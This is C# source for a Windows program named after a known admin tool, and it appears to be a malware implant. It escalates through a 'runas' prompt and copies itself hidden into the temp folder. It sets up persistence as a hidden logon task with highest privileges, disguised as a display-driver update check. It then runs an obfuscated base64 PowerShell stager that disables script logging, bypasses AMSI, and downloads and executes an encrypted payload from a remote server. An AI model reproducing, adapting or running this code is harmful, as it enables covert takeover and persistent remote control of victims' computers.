using System;
using System.Management.Automation;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.IO;
using Microsoft.Win32.TaskScheduler;

namespace PSExec
{
    class Program
    {
        static void Main(string[] args)
        {
            //Console.WriteLine(Path.GetTempPath());
            var result = IsAdmin();

            if(result.Item1 && result.Item2.Equals("possible"))
            {
                ProcessStartInfo info = new ProcessStartInfo(Process.GetCurrentProcess().MainModule.FileName, null);
                info.Verb = "runas";
                Process.Start(info);

                System.Threading.Thread.Sleep(2000);
                // Can't have 2 instances so exit
                Environment.Exit(-1);
            }

            string filePath = "";

            if (!File.Exists(Path.GetTempPath() + "PSExec.exe"))
            {
                File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.GetTempPath() + "PSExec.exe");
                filePath = Path.GetTempPath() + "PSExec.exe";
                File.SetAttributes(filePath, FileAttributes.Hidden);

                File.Copy(AppDomain.CurrentDomain.BaseDirectory + "JetBrains.Annotations.dll", Path.GetTempPath() + "JetBrains.Annotations.dll");
                File.SetAttributes(Path.GetTempPath() + "JetBrains.Annotations.dll", FileAttributes.Hidden);

                File.Copy(AppDomain.CurrentDomain.BaseDirectory + "Microsoft.Win32.TaskScheduler.dll", Path.GetTempPath() + "Microsoft.Win32.TaskScheduler.dll");
                File.SetAttributes(Path.GetTempPath() + "Microsoft.Win32.TaskScheduler.dll", FileAttributes.Hidden);
            }

            using (TaskService ts = new TaskService())
            {
                if(ts.FindTask(@"Update") == null)
                {
                    TaskDefinition td = ts.NewTask();
                    td.RegistrationInfo.Description = "Checks for display driver update";

                    td.Triggers.Add(new LogonTrigger());

                    td.Actions.Add(new ExecAction(filePath, null, Path.GetTempPath()));

                    td.Principal.RunLevel = TaskRunLevel.Highest;

                    td.Settings.Hidden = true;

                    ts.RootFolder.RegisterTaskDefinition(@"Update", td);
                }
            }

            PowerShell pInstance = PowerShell.Create();
            pInstance.AddScript("powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAFIAUwBJAG8ATgAuAE0AYQBKAG8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAEEATAB1AGUAKAAkAE4AVQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBsAD0AWwBDAG8AbABsAEUAYwBUAGkAbwBOAFMALgBHAGUAbgBFAFIAaQBDAC4ARABJAEMAdABJAE8ATgBhAFIAeQBbAFMAdABSAEkAbgBHACwAUwBZAHMAVABlAG0ALgBPAEIASgBFAEMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AEEATAB9AEUATABTAGUAewBbAFMAYwByAEkAUABUAEIATABPAGMASwBdAC4AIgBHAEUAdABGAEkAZQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAVQBlACgAJABOAFUATABsACwAKABOAGUAdwAtAE8AQgBKAEUAYwB0ACAAQwBvAGwAbABFAGMAVABJAG8ATgBzAC4ARwBlAE4AZQBSAGkAQwAuAEgAYQBTAGgAUwBlAHQAWwBTAFQAUgBpAG4AZwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAcwBTAGUAbQBCAGwAeQAuAEcARQBUAFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAEUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEATAB1AEUAKAAkAE4AdQBMAGwALAAkAHQAcgBVAEUAKQB9ADsAfQA7AFsAUwB5AFMAdABFAG0ALgBOAEUAVAAuAFMAZQByAFYAaQBjAGUAUABPAGkAbgBUAE0AYQBuAEEAZwBlAFIAXQA6ADoARQBYAFAARQBjAFQAMQAwADAAQwBvAG4AVABpAG4AVQBlAD0AMAA7ACQAVwBDAD0ATgBlAFcALQBPAEIASgBlAGMAdAAgAFMAWQBzAFQAZQBNAC4ATgBFAFQALgBXAEUAYgBDAEwAaQBFAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAQwAuAEgAZQBBAEQARQByAHMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBPAHgAeQA9AFsAUwBZAFMAVABlAG0ALgBOAEUAdAAuAFcAZQBiAFIAZQBxAFUAZQBTAHQAXQA6ADoARABFAEYAQQBVAEwAVABXAGUAQgBQAFIATwB4AFkAOwAkAHcAYwAuAFAAUgBPAFgAeQAuAEMAcgBlAEQARQBOAHQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAHQARQBNAC4ATgBFAHQALgBDAHIARQBEAEUATgB0AEkAQQBsAEMAQQBjAGgARQBdADoAOgBEAGUAZgBBAHUAbABUAE4AZQBUAFcATwBSAEsAQwBSAGUAZABlAE4AdABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAG0ALgBUAGUAWABUAC4ARQBOAEMAbwBkAGkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQB0AGUAUwAoACcAYgAoAHkALAAwAEcAIwBUAC0AKQA8ACUAXwA6AHgAZQBXAEoAcgB7ADEAbwBmAFAAUwB3AHEAdgBrADkAIQBkACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANwAuADMANQA6ADgAMAA4ADAAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABlAEEARABlAHIAUwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANwBEADcAWAA5AC8ARwBQAGIANQBwAEkALwBEAGgAOABqAC8AYwBjADkANgB1ADkAcQBUAEEAPQAiACkAOwAkAEQAQQB0AGEAPQAkAFcAQwAuAEQATwBXAG4AbABvAEEAZABEAGEAVABhACgAJABTAEUAUgArACQAdAApADsAJABJAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAEQAQQB0AGEAWwA0AC4ALgAkAEQAYQBUAEEALgBMAGUATgBnAFQAaABdADsALQBqAE8ASQBOAFsAQwBoAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==");
            pInstance.Invoke();

        }

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr tokenHandle, TokenInformationClass tokenInformationClass, IntPtr tokenInformation, int tokenInformationLength, out int returnLength);

        /// <summary>
        /// Passed to <see cref="GetTokenInformation"/> to specify what
        /// information about the token to return.
        /// </summary>
        enum TokenInformationClass
        {
            TokenUser = 1,
            TokenGroups,
            TokenPrivileges,
            TokenOwner,
            TokenPrimaryGroup,
            TokenDefaultDacl,
            TokenSource,
            TokenType,
            TokenImpersonationLevel,
            TokenStatistics,
            TokenRestrictedSids,
            TokenSessionId,
            TokenGroupsAndPrivileges,
            TokenSessionReference,
            TokenSandBoxInert,
            TokenAuditPolicy,
            TokenOrigin,
            TokenElevationType,
            TokenLinkedToken,
            TokenElevation,
            TokenHasRestrictions,
            TokenAccessInformation,
            TokenVirtualizationAllowed,
            TokenVirtualizationEnabled,
            TokenIntegrityLevel,
            TokenUiAccess,
            TokenMandatoryPolicy,
            TokenLogonSid,
            MaxTokenInfoClass
        }

        /// <summary>
        /// The elevation type for a user token.
        /// </summary>
        enum TokenElevationType
        {
            TokenElevationTypeDefault = 1,
            TokenElevationTypeFull,
            TokenElevationTypeLimited
        }

        public static Tuple<bool, string> IsAdmin()
        {

            var identity = WindowsIdentity.GetCurrent();
            if (identity == null) throw new InvalidOperationException("Couldn't get the current user identity");
            var principal = new WindowsPrincipal(identity);

            // Check if this user has the Administrator role. If they do, return immediately.
            // If UAC is on, and the process is not elevated, then this will actually return false.
            if (principal.IsInRole(WindowsBuiltInRole.Administrator)) return new Tuple<bool, string>(true, "runasoradmin");

            // If we're not running in Vista onwards, we don't have to worry about checking for UAC.
            if (Environment.OSVersion.Platform != PlatformID.Win32NT || Environment.OSVersion.Version.Major < 6)
            {
                // Operating system does not support UAC; skipping elevation check.
                return new Tuple<bool, string>(false, null);
            }

            int tokenInfLength = Marshal.SizeOf(typeof(int));
            IntPtr tokenInformation = Marshal.AllocHGlobal(tokenInfLength);

            try
            {
                var token = identity.Token;
                var result = GetTokenInformation(token, TokenInformationClass.TokenElevationType, tokenInformation, tokenInfLength, out tokenInfLength);

                if (!result)
                {
                    var exception = Marshal.GetExceptionForHR(Marshal.GetHRForLastWin32Error());
                    throw new InvalidOperationException("Couldn't get token information", exception);
                }

                var elevationType = (TokenElevationType)Marshal.ReadInt32(tokenInformation);

                switch (elevationType)
                {
                    case TokenElevationType.TokenElevationTypeDefault:
                        // TokenElevationTypeDefault - User is not using a split token, so they cannot elevate.
                        return new Tuple<bool, string>(false, "nochance");
                    case TokenElevationType.TokenElevationTypeFull:
                        // TokenElevationTypeFull - User has a split token, and the process is running elevated. Assuming they're an administrator.
                        return new Tuple<bool, string>(true, "runasadmin");
                    case TokenElevationType.TokenElevationTypeLimited:
                        // TokenElevationTypeLimited - User has a split token, but the process is not running elevated. Assuming they're an administrator.
                        return new Tuple<bool, string>(true, "possible");
                    default:
                        // Unknown token elevation type.
                        return new Tuple<bool, string>(false, null);
                }
            }
            finally
            {
                if (tokenInformation != IntPtr.Zero) Marshal.FreeHGlobal(tokenInformation);
            }

        }
    }
}
